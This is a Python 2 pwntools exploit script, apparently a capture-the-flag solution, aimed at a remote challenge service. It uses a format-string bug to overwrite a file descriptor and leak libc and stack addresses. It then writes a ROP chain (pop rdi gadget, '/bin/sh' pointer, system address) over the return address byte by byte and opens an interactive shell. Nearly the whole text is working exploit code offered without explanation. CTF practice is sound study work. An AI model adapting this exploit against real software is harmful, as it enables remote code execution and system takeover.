#! /usr/bin/env python

from pwn import *

#io = remote('localhost', 8888)
io = remote('csie.ctf.tw', 10132)

raw_input('@')

## libc addr
libc_start_offset = 0x21ab0
start_bin_offset = 0xe7
system_offset = 0x4f440

## gadget
pop_rdi = 0x400893

#   Overwrite fd
p2cursor = '5'     # $rsp
cursor = '7'           # $rsp + 0x10
fd_addr = 0x601010
MARK = 'AAAA'

fmt_w_fd_addr = '%' + str(fd_addr) + 'c' + '%' + cursor + '$n'
io.send(fmt_w_fd_addr.ljust(0x30,'\x00'))
fmt_w_fd = '%1c' + '%9$hhn'
io.send(fmt_w_fd.ljust(0x30,'\x00'))

#   leak libc/stack
fmt_leak_libc = '%10$p' + MARK
io.send(fmt_leak_libc)
leak_libc = int(io.recvuntil(MARK,True), 16)
fmt_leak_stack = '%5$p' + MARK
io.send(fmt_leak_stack)
leak_stack = int(io.recvuntil(MARK,True), 16) - 0x10

libc_base = leak_libc - libc_start_offset - start_bin_offset

print "libc base : " + hex(libc_base)
print "$rsp      : " + hex(leak_stack)



# ret2addr + one gadget

## write pop_rdi gadget to ret_addr
pop_rdi_tmp = pop_rdi
addr = leak_stack + 0x18
io.send(MARK+'\x00')
for i in range(0,3):
    fmt_mv_cursor = '%' + str(addr%0x100 + i) + 'c' + '%' + p2cursor + '$hhn' + MARK
    io.sendafter( MARK, fmt_mv_cursor.ljust(0x30,'\x00') )
    fmt_w_pop_rdi = '%' + str(pop_rdi_tmp%0x10000) + 'c' + '%' + cursor + '$hhn' + MARK
    io.sendafter( MARK, fmt_w_pop_rdi.ljust(0x30,'\x00') )
    pop_rdi_tmp /= 0x100

## write address stored '/bin/sh' to ret_addr + 0x8
str_addr = 0x6010a4  # following exit str
addr = leak_stack + 0x20
for i in range(0,3):
    fmt_mv_cursor = '%' + str(addr%0x100 + i) + 'c' + '%' + p2cursor + '$hhn' + MARK
    io.sendafter( MARK, fmt_mv_cursor.ljust(0x30,'\x00') )
    fmt_w_str_addr = '%' + str(str_addr) + 'c' + '%' + cursor + '$hhn' + MARK
    io.sendafter( MARK, fmt_w_str_addr.ljust(0x30,'\x00') )
    str_addr /= 0x100

## write system addr at ret_addr + 0x10
system = libc_base + system_offset
print "system: " + hex(system)
addr = leak_stack + 0x28
for i in range(0,3):
    fmt_mv_cursor = '%' + str(addr%0x100 + i*2) + 'c' + '%' + p2cursor + '$hhn' + MARK
    io.sendafter( MARK, fmt_mv_cursor.ljust(0x30,'\x00') )
    fmt_w_system = '%' + str(system%0x10000) + 'c' + '%' + cursor + '$hn' + MARK
    io.sendafter( MARK, fmt_w_system.ljust(0x30,'\x00') )
    system /= 0x10000

# exit and get shell
io.recvuntil(MARK)

fmt_leak = '%'+str(8)+'$p' + MARK
io.send(fmt_leak.ljust(0x30,'\x00'))
leak_addr = io.recvuntil(MARK,True)
print "ret addr  : " + leak_addr
fmt_leak = '%'+str(9)+'$p' + MARK
io.send(fmt_leak.ljust(0x30,'\x00'))
leak_addr = io.recvuntil(MARK,True)
print "str addr  : " + leak_addr
fmt_leak = '%'+str(10)+'$p' + MARK
io.send(fmt_leak.ljust(0x30,'\x00'))
leak_addr = io.recvuntil(MARK,True)
print "sys addr  : " + leak_addr

fmt_leak = '%'+str(10)+'$s' + MARK
io.send(fmt_leak.ljust(0x30,'\x00'))
leak_addr = io.recvuntil(MARK,True)
context.arch = 'i386'
print disasm(leak_addr, )

io.send('exit/bin/sh')

io.interactive()
